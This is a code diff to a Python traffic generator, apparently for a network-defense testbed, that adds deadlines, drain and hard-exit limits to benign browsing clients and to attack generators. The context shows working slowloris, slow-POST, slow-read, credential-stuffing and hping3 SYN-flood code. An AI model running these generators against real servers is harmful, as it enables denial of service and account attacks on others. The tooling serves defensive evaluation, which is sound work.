@@ -31,6 +31,12 @@ on with its slot's schedule, and --plan prints the schedule. With a number there
 re-opened and failed to open, those that failed for a local reason (no such source address, no descriptors: not the
 server's doing), and the bytes it sent.
 
+The deadline (ml/p1_prereg_3.json generator; review T-050 T050-03, -04, -16), for every kind: a generator's end is its start + --duration.
+Every think time and pause is cut at it, so no draw moves. No new view starts after it. A view in flight may finish within DRAIN_S, so a
+healthy client's last view keeps its rows; no request starts, and no wait lasts, past the end + DRAIN_S, so a request hanging there (an
+XDP-banned address, a dead server) gets its row with its error and the rest of its view is abandoned. At the end + HARD_EXIT_S the process
+exits whatever it is doing, with code 0 and what it has written: an arm that banned it did not break it.
+
 --records PATH (L7 v2, docs/L7V2_DESIGN.md §5.1; benign plan kinds): one CSV row per request as it
 completes (eval/l7v2_harm.RECORD_COLUMNS): t_intended = t_sent (a closed-loop client has no schedule
 within a view), t_done, status, err, the route class (l7_webapp's site map), the plan's user, view and
@@ -67,6 +73,9 @@ SOURCE = None          # the entity's own address when --source is given (P3); N
 RECORDER = None        # the client-side harm records when --records is given (L7 v2); None: nothing is written
 RECORD_COLUMNS = ("t_intended", "t_sent", "t_done", "status", "err", "route_class", "user", "view", "wave",
                   "t_nominal", "t_origin")
+DRAIN_S = 5.0          # what a view or request in flight at a generator's end may still take (ml/p1_prereg_3.json generator)
+HARD_EXIT_S = 7.0      # past its end a generator exits whatever it is doing; under eval/p4_runner.py STOP_GRACE_S
+LIVE_STATS = None      # what a generator of the P4 pacing has done so far, for a hard exit (--stats)
 
 
 class Recorder:
@@ -145,9 +154,28 @@ def _deadline(duration):
     return time.time() + duration
 
 
-def _rate_sleep(rps, rng):
+def _cut(seconds, end):
+    """A think time or pause cut at the generator's end; its length is already drawn, so no stream moves."""
+    time.sleep(max(0.0, min(seconds, end - time.time())))
+
+
+def _timeout(most, end):
+    """A request's timeout: at most `most`, and no wait past the generator's end + DRAIN_S."""
+    return max(0.05, min(most, end + DRAIN_S - time.time()))
+
+
+def _rate_sleep(rps, rng, end):
     # Poisson-ish spacing around the target rate.
-    time.sleep(max(0.0, rng.expovariate(rps) if rps > 0 else 0.0))
+    _cut(max(0.0, rng.expovariate(rps) if rps > 0 else 0.0), end)
+
+
+def _run_curl(end, make_argv):
+    """curl, bounded as any request (_timeout); make_argv takes its --max-time. A curl past that is killed."""
+    limit = _timeout(10.0, end)
+    try:
+        subprocess.run(make_argv(f"{limit:.2f}"), capture_output=True, check=False, timeout=limit + 1.0)
+    except subprocess.TimeoutExpired:
+        pass
 
 
 def _base(host, port):
@@ -161,9 +189,9 @@ def benign_curl_oneshot(host, port, params, dur, rng):
     end = _deadline(dur)
     while time.time() < end:
         url = _base(host, port) + _paths(params.get("paths", "mixed"), rng)
-        subprocess.run(_curl("-s", "-k", "-o", "/dev/null", "--max-time", "10",
-                             "-A", rng.choice(UAS), url), capture_output=True, check=False)
-        time.sleep(rng.uniform(lo, hi))
+        ua = rng.choice(UAS)
+        _run_curl(end, lambda t, _u=ua, _url=url: _curl("-s", "-k", "-o", "/dev/null", "--max-time", t, "-A", _u, _url))
+        _cut(rng.uniform(lo, hi), end)
 
 
 def benign_http2(host, port, params, dur, rng):
@@ -172,10 +200,10 @@ def benign_http2(host, port, params, dur, rng):
     end = _deadline(dur)
     while time.time() < end:
         urls = [_base(host, port) + _paths("assets", rng) for _ in range(n)]
-        subprocess.run(_curl("-s", "-k", "--http2", "--parallel", "-o", "/dev/null",
-                             "--max-time", "10", "-A", rng.choice(UAS), *urls),
-                       capture_output=True, check=False)
-        time.sleep(rng.uniform(lo, hi))
+        ua = rng.choice(UAS)
+        _run_curl(end, lambda t, _u=ua, _urls=urls: _curl("-s", "-k", "--http2", "--parallel", "-o", "/dev/null",
+                                                          "--max-time", t, "-A", _u, *_urls))
+        _cut(rng.uniform(lo, hi), end)
 
 
 def _session_browse(sess, host, port, params, rng, end):
@@ -188,10 +216,10 @@ def _session_browse(sess, host, port, params, rng, end):
             break
         try:
             sess.get(_base(host, port) + _paths(params.get("paths", "browse"), rng),
-                     headers=headers, verify=False, timeout=10)
+                     headers=headers, verify=False, timeout=_timeout(10.0, end))
         except requests.RequestException:
             break
-        time.sleep(rng.uniform(lo, hi))
+        _cut(rng.uniform(lo, hi), end)
 
 
 def benign_keepalive(host, port, params, dur, rng):
@@ -199,7 +227,7 @@ def benign_keepalive(host, port, params, dur, rng):
     while time.time() < end:
         with _new_session() as sess:
             _session_browse(sess, host, port, params, rng, end)
-        time.sleep(rng.uniform(0.5, 2.0))
+        _cut(rng.uniform(0.5, 2.0), end)
 
 
 def benign_api_poll(host, port, params, dur, rng):
@@ -210,11 +238,11 @@ def benign_api_poll(host, port, params, dur, rng):
     with _new_session() as sess:
         while time.time() < end:
             try:
-                sess.get(_base(host, port) + path, verify=False, timeout=10,
+                sess.get(_base(host, port) + path, verify=False, timeout=_timeout(10.0, end),
                          headers={"User-Agent": "TestbedMonitor/1.0"})
             except requests.RequestException:
                 pass
-            time.sleep(rng.uniform(lo, hi))
+            _cut(rng.uniform(lo, hi), end)
 
 
 def benign_downloader(host, port, params, dur, rng):
@@ -224,10 +252,10 @@ def benign_downloader(host, port, params, dur, rng):
     end = _deadline(dur)
     while time.time() < end:
         try:
-            _one_shot("get", _base(host, port) + path, verify=False, timeout=30)
+            _one_shot("get", _base(host, port) + path, verify=False, timeout=_timeout(30.0, end))
         except requests.RequestException:
             pass
-        time.sleep(rng.uniform(lo, hi))
+        _cut(rng.uniform(lo, hi), end)
 
 
 class UploadDeadline(Exception):
@@ -322,12 +350,15 @@ def benign_nat_gateway(host, port, params, dur, rng):
 #    l7_benign.plan_client() builds from this process's seed — the same plan the
 #    admissibility gate (ml/l7_admissibility.py) simulated. ──
 
-def _quiet_get(sess, url, headers=None, tag=None):
-    """GET, never raising; with --records and a `tag` (path, user, view, wave, nominal start) it writes the row."""
+def _quiet_get(sess, url, headers=None, tag=None, end=None):
+    """GET, never raising; with --records and a `tag` (path, user, view, wave, nominal start) it writes the row. With the generator's
+    `end` it sends nothing past end + DRAIN_S and waits no longer than that."""
     import requests
     t_sent, status, err = time.time(), "nan", ""
+    if end is not None and t_sent >= end + DRAIN_S:
+        return
     try:
-        resp = sess.get(url, verify=False, timeout=10, headers=headers)
+        resp = sess.get(url, verify=False, timeout=10 if end is None else _timeout(10.0, end), headers=headers)
         status = getattr(resp, "status_code", "nan")
     except requests.Timeout:
         err = "timeout"
@@ -373,11 +404,13 @@ def _browser_device(base, user, start, end, uid=0):
             if time.time() >= end:
                 break
             for i, wave in enumerate(v["waves"]):
+                if time.time() >= end + DRAIN_S:
+                    break
                 if wave:
                     hdrs = _referer(base, v.get("ref") if i == 0 else v.get("doc")) if "doc" in v else None
                     list(pool.map(lambda p, _s=sess, _h=hdrs, _t=(uid, vi, i, start + v["t"]):
-                                  _quiet_get(_s, base + p, _h, (p, *_t)), wave))
-            time.sleep(max(0.0, min(v["pause_s"], end - time.time())))
+                                  _quiet_get(_s, base + p, _h, (p, *_t), end), wave))
+            _cut(v["pause_s"], end)
 
 
 def _paced_user(base, user, end, uid=0, start=None):
@@ -389,9 +422,9 @@ def _paced_user(base, user, end, uid=0, start=None):
             path, gap = item[0], item[1]
             if time.time() >= end:
                 break
-            _quiet_get(sess, base + path, _referer(base, item[2]) if len(item) > 2 else None, (path, uid, vi, 0, t_nom))
+            _quiet_get(sess, base + path, _referer(base, item[2]) if len(item) > 2 else None, (path, uid, vi, 0, t_nom), end)
             t_nom += gap
-            time.sleep(max(0.0, min(gap, end - time.time())))
+            _cut(gap, end)
 
 
 def _run_plan(kind, host, port, params, dur, rng):
@@ -478,10 +511,10 @@ def attack_rate_get(host, port, params, dur, rng, path_fn=None, extra_headers=No
             url = _base(host, port) + (path_fn(rng) if path_fn
                                        else _paths(params.get("paths", "mixed"), rng))
             try:
-                sess.get(url, headers=headers, verify=False, timeout=10)
+                sess.get(url, headers=headers, verify=False, timeout=_timeout(10.0, end))
             except requests.RequestException:
                 pass
-            _rate_sleep(rps, rng)
+            _rate_sleep(rps, rng, end)
 
 
 def attack_subthreshold_flood(host, port, params, dur, rng):
@@ -506,20 +539,22 @@ def attack_credstuff(host, port, params, dur, rng):
         while time.time() < end:
             body = json.dumps({"u": f"user{rng.randrange(10**6)}", "p": "x" * 12}).encode()
             try:
-                sess.post(_base(host, port) + path, data=body, verify=False, timeout=10,
+                sess.post(_base(host, port) + path, data=body, verify=False, timeout=_timeout(10.0, end),
                           headers={"User-Agent": rng.choice(UAS)})
             except requests.RequestException:
                 pass
-            _rate_sleep(rps, rng)
+            _rate_sleep(rps, rng, end)
 
 
 LOCAL_ERRNOS = {errno.EADDRNOTAVAIL, errno.EADDRINUSE, errno.EMFILE, errno.ENFILE, errno.ENOBUFS, errno.ENOMEM,
                 errno.ENETUNREACH}       # an open that failed for a reason of this machine, not the server's answer
 
 
-def _open_sockets(host, port, n, send_head, errors=None):
+def _open_sockets(host, port, n, send_head, errors=None, end=None):
     socks = []
     for _ in range(n):
+        if end is not None and time.time() >= end:
+            break
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4)
@@ -568,7 +603,8 @@ def run_slow_schedule(host, port, sched, dur):
     post = sched["family"] == "slowpost"
     slots = sched["slots"]
     events = [s["chunks"] if post else s["lines"] for s in slots]
-    stats = {"opened": 0, "reopened": 0, "sent_bytes": 0, "failed_opens": 0, "local_errors": 0}
+    global LIVE_STATS
+    stats = LIVE_STATS = {"opened": 0, "reopened": 0, "sent_bytes": 0, "failed_opens": 0, "local_errors": 0}
     conns, opens, body = [None] * len(slots), [0] * len(slots), [0] * len(slots)
 
     def head(i):
@@ -597,12 +633,14 @@ def run_slow_schedule(host, port, sched, dur):
     start = time.time()
     end = start + dur
     for i in range(len(slots)):
+        if time.time() >= end:
+            break
         conns[i] = open_slot(i)
     heap = [(ev[0][0], i, 0) for i, ev in enumerate(events) if ev]
     heapq.heapify(heap)
     while heap:
         t, i, k = heapq.heappop(heap)
-        if start + t >= end:
+        if start + t >= end or time.time() >= end:     # late events stop at the end too: an unreachable server costs 4 s per open
             break
         time.sleep(max(0.0, start + t - time.time()))
         if conns[i] is None:
@@ -641,15 +679,17 @@ def attack_slowloris(host, port, params, dur, rng):
     every = params["header_every_s"]
     head = (f"GET /?r={rng.randrange(10**6)} HTTP/1.1\r\nHost: {host}\r\n"
             f"User-Agent: {rng.choice(UAS)}\r\n").encode()
-    socks = _open_sockets(host, 80, conns, head)       # slowloris is plaintext here
     end = _deadline(dur)
+    socks = _open_sockets(host, 80, conns, head, end=end)       # slowloris is plaintext here
     while time.time() < end and socks:
         for s in list(socks):
+            if time.time() >= end:
+                break
             try:
                 s.sendall(f"X-{rng.randrange(10**4)}: {rng.randrange(10**4)}\r\n".encode())
             except OSError:
                 socks.remove(s)
-        time.sleep(every)
+        _cut(every, end)
     for s in socks:
         s.close()
 
@@ -665,11 +705,13 @@ def attack_slowpost(host, port, params, dur, rng):
     n = min(params.get("body_bytes", 60000), 65536)
     head = (f"POST /upload HTTP/1.1\r\nHost: {host}\r\n"
             f"Content-Type: application/octet-stream\r\nContent-Length: {n}\r\n\r\n").encode()
-    socks = _open_sockets(host, 80, conns, head)
-    sent = {id(s): 0 for s in socks}
     end = _deadline(dur)
+    socks = _open_sockets(host, 80, conns, head, end=end)
+    sent = {id(s): 0 for s in socks}
     while time.time() < end and socks:
         for s in list(socks):
+            if time.time() >= end:
+                break
             try:
                 s.sendall(b"x")
                 sent[id(s)] += 1
@@ -679,10 +721,10 @@ def attack_slowpost(host, port, params, dur, rng):
             except OSError:
                 socks.remove(s)
         if len(socks) < conns:
-            for s in _open_sockets(host, 80, conns - len(socks), head):
+            for s in _open_sockets(host, 80, conns - len(socks), head, end=end):
                 socks.append(s)
                 sent[id(s)] = 0
-        time.sleep(every)
+        _cut(every, end)
     for s in socks:
         s.close()
 
@@ -693,16 +735,18 @@ def attack_slowread(host, port, params, dur, rng):
     every = params["read_every_s"]
     path = params.get("path", "/download/large")
     head = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {rng.choice(UAS)}\r\n\r\n".encode()
-    socks = _open_sockets(host, 80, conns, head)
     end = _deadline(dur)
+    socks = _open_sockets(host, 80, conns, head, end=end)
     while time.time() < end and socks:
         for s in list(socks):
+            if time.time() >= end:
+                break
             try:
                 if not s.recv(256):          # advertise a tiny read rate
                     socks.remove(s)
             except OSError:
                 socks.remove(s)
-        time.sleep(every)
+        _cut(every, end)
     for s in socks:
         s.close()
 
@@ -714,7 +758,7 @@ def attack_volumetric_flood(host, port, params, dur, rng):
     proc = subprocess.Popen(["hping3", "-S", "-p", "80", "-i", "u500", *src, host],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     try:
-        time.sleep(params.get("dur_s", dur))
+        time.sleep(min(params.get("dur_s", dur), dur))
     finally:
         proc.terminate()
 
@@ -741,6 +785,17 @@ def resolve(role, name):
     if name not in table:
         raise SystemExit(f"[-] unknown {role} kind/family: {name} (have {sorted(table)})")
     return table[name]
+
+
+def _hard_exit(stats_path):
+    """The bound on every kind (the module doc): exit now, with code 0 and what is written. Rows are flushed line by line, and holding
+    the recorder's lock keeps a row from being cut in the middle."""
+    if RECORDER is not None:
+        RECORDER.lock.acquire(timeout=1.0)
+    if stats_path:
+        with open(stats_path, "w", encoding="utf-8") as fh:
+            json.dump(LIVE_STATS or {}, fh)
+    os._exit(0)
 
 
 def main(argv=None):
@@ -789,6 +844,9 @@ def main(argv=None):
         os.environ.setdefault("PYTHONWARNINGS", "ignore")      # self-signed cert
     if args.records is not None:
         RECORDER = Recorder(args.records)
+    bound = threading.Timer(args.duration + HARD_EXIT_S, _hard_exit, args=(args.stats,))
+    bound.daemon = True
+    bound.start()
     try:
         stats = fn(args.host, args.port, params, args.duration, random.Random(args.seed))
     finally:
